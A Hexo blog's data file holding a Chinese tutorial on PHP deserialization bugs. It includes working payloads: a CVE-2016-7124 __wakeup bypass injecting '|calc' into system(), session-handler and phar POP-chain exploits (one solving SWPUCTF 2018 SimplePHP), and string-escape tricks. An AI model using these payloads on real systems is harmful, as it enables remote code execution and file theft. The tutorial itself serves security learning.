{"meta":{"title":"孤独星球","subtitle":"H3h3QAQの博客","description":"本科 | 软件工程 | 网络安全","author":"H3h3QAQ","url":"https://h3h3qaq.github.io","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.525Z","comments":true,"path":"404.html","permalink":"https://h3h3qaq.github.io/404.html","excerpt":"","text":""},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/index.html","permalink":"https://h3h3qaq.github.io/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"","date":"2021-11-10T11:35:46.649Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"https://h3h3qaq.github.io/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2021-11-10T11:35:46.652Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"https://h3h3qaq.github.io/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"about/index.html","permalink":"https://h3h3qaq.github.io/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"archives/index.html","permalink":"https://h3h3qaq.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"categories/index.html","permalink":"https://h3h3qaq.github.io/categories/index.html","excerpt":"","text":""},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-10T11:35:46.650Z","comments":true,"path":"census/index.html","permalink":"https://h3h3qaq.github.io/census/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"contact/index.html","permalink":"https://h3h3qaq.github.io/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 Luckeyの友链信息 博客名称: Luckeyの博客 博客网址: http://www.luckyzmj.cn 博客头像: https://s1.ax1x.com/2020/05/17/YRWsYT.png 博客介绍: The harder you work, the luckier you will be"},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"friends/index.html","permalink":"https://h3h3qaq.github.io/friends/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"resource/index.html","permalink":"https://h3h3qaq.github.io/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.654Z","comments":true,"path":"tags/index.html","permalink":"https://h3h3qaq.github.io/tags/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-10T11:35:46.532Z","updated":"2021-11-10T11:35:46.532Z","comments":true,"path":"List/galleries/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/movies/index.html","permalink":"https://h3h3qaq.github.io/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/music/index.html","permalink":"https://h3h3qaq.github.io/List/music/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.543Z","comments":true,"path":"List/tools/index.html","permalink":"https://h3h3qaq.github.io/List/tools/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2021-11-10T11:35:46.534Z","updated":"2021-11-10T11:35:46.534Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2021-11-10T11:35:46.533Z","updated":"2021-11-10T11:35:46.533Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2021-11-10T11:35:46.536Z","updated":"2021-11-10T11:35:46.536Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2021-11-10T11:35:46.537Z","updated":"2021-11-10T11:35:46.537Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2021-11-10T11:35:46.539Z","updated":"2021-11-10T11:35:46.539Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2021-11-10T11:35:46.541Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"PHP反序列化漏洞基础","date":"2021-11-10T12:05:12.135Z","updated":"2021-08-25T08:47:47.671Z","comments":true,"path":"posts/0.html","link":"","permalink":"https://h3h3qaq.github.io/posts/0.html","excerpt":"","text":"#PHP序列化与序列化 作者：H3h3QAQ ##一、PHP序列化和反序列化 ###1.PHP反序列化： serialize() 将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构 常见的序列化字母表示及其含义： a - array -----&gt;a:&lt;n&gt;:{&lt;key 1&gt;&lt;value 1&gt;...&lt;key n&gt;&lt;value n&gt;} b - boolean -----&gt;b:&lt;digit&gt; d - double -----&gt;d:&lt;number&gt; i - integer -----&gt;i:&lt;number&gt; o - common r - reference s - string -----&gt;s:&lt;length&gt;:\"&lt;value&gt;\" C - custom object O - class -----&gt;O:&lt;length&gt;:\"&lt;class name&gt;\":&lt;n&gt;:{&lt;field name 1&gt;&lt;field value1&gt;...&lt;field name n&gt;&lt;field value n&gt;} N - null R - pointer reference U - unicode string &lt;?php class h3{ public $v1; public $v2=false; public $v3=1; public $v4=2.1; public $v5=array(); public $v6=\"h3h3QAQ\"; private $v7=\"H3h3QAQ\"; protected $v8=\"protected\"; } $s=serialize(new h3()); echo $s; var_dump(unserialize($s)); 序列化运行结果为： O:2:\"h3\":8:{s:2:\"v1\";N;s:2:\"v2\";b:0;s:2:\"v3\";i:1;s:2:\"v4\";d:2.1;s:2:\"v5\";a:0:{}s:2:\"v6\";s:7:\"h3h3QAQ\";s:6:\" h3 v7\";s:7:\"H3h3QAQ\";s:5:\" * v8\";s:9:\"protected\";} 反序列化运行结果 object(h3)#1 (8) { [\"v1\"]=&gt; NULL [\"v2\"]=&gt; bool(false) [\"v3\"]=&gt; int(1) [\"v4\"]=&gt; float(2.1) [\"v5\"]=&gt; array(0) { } [\"v6\"]=&gt; string(7) \"h3h3QAQ\" [\"v7\":\"h3\":private]=&gt; string(7) \"H3h3QAQ\" [\"v8\":protected]=&gt; string(9) \"protected\" } ####（1）各种魔术方法 __destruct()：//析构函数当对象被销毁时会被自动调用 __wakeup(): //unserialize()时会被自动调用 __invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用 __call(): //在对象上下文中调用不可访问的方法时触发 __callStatci(): //在静态上下文中调用不可访问的方法时触发 __get(): //用于从不可访问的属性读取数据 __set(): //用于将数据写入不可访问的属性 __isset(): //在不可访问的属性上调用isset()或empty()触发 __unset(): //在不可访问的属性上使用unset()时触发 __toString(): //把类当作字符串使用时触发 __construct(): //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 __sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用 当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124） （2）PHP反序列化特性1.PHP在反序列化时，底层代码时以;作为字段的分隔，以}作为结尾（字符串除外），并且是根据长度判断内容的。 2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。 3.对类中不存在的属性也会进行反序列化。 2.session反序列化（1）session概念PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。 （2）会话过程当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到$_SESSION变量中。当PHP停止的时候，它会自动读取$_SESSION中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。 默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数session_start()来手动开始一个会话。如果配置项session.auto_start设置为1，那么请求开始的时候，会话会自动开始 PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数session_write_close()来手动关闭会话 （3）存储引擎PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项session.save_handler来进行确定的，默认是以文件的方式储存。储存的文件是以sess_PHPSESSID来进行命名的，文件的内容就是session值得序列化之后得内容。 session.serialize_handler有如下三种取值： &lt;?php error_reporting(0); in_set('session.serialize_handeler','php_binary');//这里可以换不同的存储引擎 session_start(); $_SESSION['username']=$_GET['username']; ?&gt; 每种存储引擎存储的内容格式： ###3.phar反序列化 phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞 phar文件的结构： -stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件 -manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点 -contents：压缩文件的内容 -signature：签名，在文件末尾 生成phar文件 一定要将php.ini中的phar.readonly选项设置为Off &lt;?php class h3{ } @unlink(\"phar.phar\"); $phar= new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php__HALT_COMPILER();?&gt;\");//设置stub，添加gif文件头 $o=new h3(); $phar-&gt;setMetadata($o);//将自定义meat-data存入manifest $phar-&gt;addFromString(\"test.txt\",\"test\");//添加要压缩的文件 $phar-&gt;stopBuffering(); ?&gt; ##二、反序列化漏洞 1.反序列化成因主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作 （1）phar反序列化漏洞造成原因漏洞出发点在使用phar://协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞 2.反序列化漏洞（1）PHP反序列化漏洞&lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们可以简单的分析一下代码 定义了一个class类，类中有两个私有变量method和args 有三个魔术方法： function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() //析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } 分析代码段中host的来源，想办法利用system()构成RCE &lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct()//析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们观察代码可知： GET方法获取参数a，并且将其反序列化。 但是再执行反序列化的时候，会自动调用__wakeup()魔术方法，把args的值改为127.0.0.1 无论我们怎么构造payload，system()执行的命令都是ping -c 2 127.0.0.1 这时我们可以利用到CVE-2016-7124漏洞 适用版本： PHP5&lt;5.6.25、PHP7&lt;7.0.1 当成员属性数目大于实际数码时可绕过__wakeup方法 就可以构造恶意payload来RCE 这里还有个小知识点|管道符 把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。 所以我们可以构造序列化了 &lt;?php class home{ private $method=\"ping\"; private $args=array(\"|calc\"); } serialize(new home()); O:4:\"home\":2:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} 需要跳一下__wakeup()把成员属性数目改为3 O:4:\"home\":3:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} URL编码一下 O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D 成功RCE ####（2）session反序列化漏洞 当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以php_serialize序列化存储session，以PHP反序列化读取session，造成反序列化攻击 例子： phpinfo： s1.php： &lt;?php highlight_file(__FILE__); error_reporting(0); ini_set(\"session.serialize_handler\",'php_serialize'); session_start(); $_SESSION[\"h3\"]=$_GET[\"u\"]; ?&gt; s2.php： &lt;?php highlight_file(__FILE__); session_start(); class session{ var $var; function __destruct(){ eval($this-&gt;var); } } ?&gt; 这里需要说一下unserialize的特性，在执行unserialize的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略 a:1:{s:2:\"h3\";s:52:\"|O:7:\"session\":1:{s:3:\"var\";s:15:\"system('calc');\";}\";} exp： &lt;?php class session{ var $var=\"system('calc');\"; } echo \"|\".serialize(new session()); 执行结果: 上文可以给$_SESSION赋值，若代码中不存在给$_SESSION赋值可以利用uplode_process机制，可以在$_SESSION中创建一个键值对，其中的值可以控制 &lt;?php $key=ini_get(\"session.upload_progress.prefix\") . ini_get(\"session.upload_progress.name\"); var_dump($_SESSION[$key]); ?&gt; （3）phar反序列化利用条件： -phar文件能够上传到服务器 -要有可用的魔术方法作为“跳板” -文件操作函数的参数可控，且：/ \\ 等特殊字符没有被过滤 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下 例题:[SWPUCTF 2018]SimplePHP 存在任意文件读取 先来读取一下upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; 再来读取一下function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) { //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; 再读取一下base.php 发现了提示 回头再来看class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; 在Test类中存在敏感操作 public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } 可以反向推poc链 通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知__get-&gt;get-&gt;file_get，所以关键是触发__get方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法 class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } public function __toString() //把类当作字符串使用时触发 { $content = $this-&gt;str['str']-&gt;source; return $content; } 查看一下怎么能够触发__toString()方法 public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } 知要echo test即可 整条链子为 C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get() exp如下 &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $a= new C1e4r(); $b= new Show(); $c= new Test(); $c-&gt;params['source'] = \"/var/www/html/f1ag.php\"; $a-&gt;str = $b; $b-&gt;str['str'] = $c; $phar = new Phar(\"exp.phar\"); //生成phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); $phar-&gt;setMetadata($a); //触发头是C1e4r类 $phar-&gt;addFromString(\"exp.txt\", \"test\"); //生成签名 $phar-&gt;stopBuffering(); ?&gt; 修改生成得phar文件后缀 上传成功后回到文件读取点来读phar文件 拿到base64加密得flag 反序列化字符逃逸一、概念在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。 二、字符变多例子： 该题源码如下 &lt;?php include 'flag.php'; function filter($string){ return str_replace('x','yy',$string); } $username=$_GET['u']; $password=\"aaa\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); echo $r; $a= unserialize($r); if ($a[1]==='admin'){ echo $flag; } highlight_file(__FILE__); ?&gt; 文件包含了flag 然后filter()方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度 我们试着传入u=admin 序列化为： a:2:{i:0;s:5:\\\"admin\\\";i:1;s:3:\\\"aaa\\\";} 反序列化后 a[1]不等于”admin” 没有满足条件 我们构造一下数组 &lt;?php $a= array('a',\"admin\"); echo serialize($a); a:2:{i:0;s:1:\"a\";i:1;s:5:\"admin\";} 但是我们只有一个参数username可控 可以利用字符串逃逸 复制自己想要构造的字符串 \";i:1;s:5:\"admin\";} 按照长度添加字符串，已知长度为19 则在前方填充19个x 'xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";} 测试一下 &lt;?php $a= array('xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";}',\"a\"); $s= serialize($a); $v = str_replace('x','yy',$s); echo $v; 运行结果 a:2:{i:0;s:38:\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\";i:1;s:5:\"admin\";}\";i:1;s:1:\"a\";} 可以看到已经逃逸出来了 这里利用了序列化的特性 反序列化看一下 array(2) { [0] =&gt; string(38) \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" [1] =&gt; string(5) \"admin\" } 可以观察整个数据的变化 成功逃逸。获得flag 三、字符变少也是拿一道题做例子 &lt;?php error_reporting(0); include 'flag.php'; function filter($string){ return str_replace('sec','',$string); } $username=$_GET['u']; $password=$_GET['p']; $auth=\"guest\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); $a=unserialize($r); if($a[2]==='admin'){ echo flag; } highlight_file(__FILE__); ?&gt; 跟上一道题差不多 先随意构造一下争取的payload： &lt;?php $a= array(\"u\",\"p\",\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 运行后拿到所需部分 \";i:2;s:5:\"admin\";} 需要我们传入的payload u=xxx&amp;p=xxxx 已知两个可控值中间的部分不变（可能会多一位） \";i:1;s:1:\" 这里可以利用替换方法换成空值从而完成逃逸 &lt;?php $a= array(\"secsecsecsec\",'\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}',\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 执行结果 a:3:{i:0;s:12:\"secsecsecsec\";i:1;s:31:\"\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}\";i:2;s:5:\"admin\";} 可以看到已经完成了逃逸 反序列化一下看看 array(3) { [0] =&gt; string(12) \"\";i:1;s:31:\"\" [1] =&gt; string(1) \"p\" [2] =&gt; string(5) \"admin\" } a[2]=admin 拿到flag","categories":[],"tags":[]}],"categories":[],"tags":[]}